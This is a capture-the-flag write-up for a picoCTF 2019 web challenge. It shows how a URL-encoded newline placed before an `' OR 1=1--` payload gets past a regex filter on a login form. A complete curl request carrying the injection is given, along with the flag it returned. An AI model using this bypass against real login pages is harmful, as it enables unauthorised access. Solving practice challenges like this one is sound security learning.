# Irish-Name-Repo 2 - 350 points
## Description

There is a website running at `https://2019shell1.picoctf.com/problem/58043/` ([link](https://2019shell1.picoctf.com/problem/58043/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://2019shell1.picoctf.com:58043

## Flag

```
picoCTF{m0R3_SQL_plz_c9c1c726}
```

## Solution

Okay, so we already know that the vulnerability is SQL injection from the last challenge. We try to inject simple payloads like `' OR 1=1 --` but there seems to be some kind of filter in place.

After messing around I realized that the filter behaves like regular expressions and realized that they might terminate at a newline.

So, I made a request with a newline before my payload:

```sh
curl 'https://2019shell1.picoctf.com/problem/58043/login.php' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6  Sicherheits-Erg\xe4nzungsupdate) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://2019shell1.picoctf.com/problem/58043/login.html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiJz5cIj48aDE-aGk8L2gxPiJ9.5TyqQ5kcsGZB2MeWCkp6wRPvl3TfqQ_Pk83Dcv2kNbA' -H 'Upgrade-Insecure-Requests: 1' --data 'username=%27%0A or 1=1--&password=&debug=0'
```

I got this response:

```
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c9c1c726}</p>
```

Nice, an easy start to this CTF.
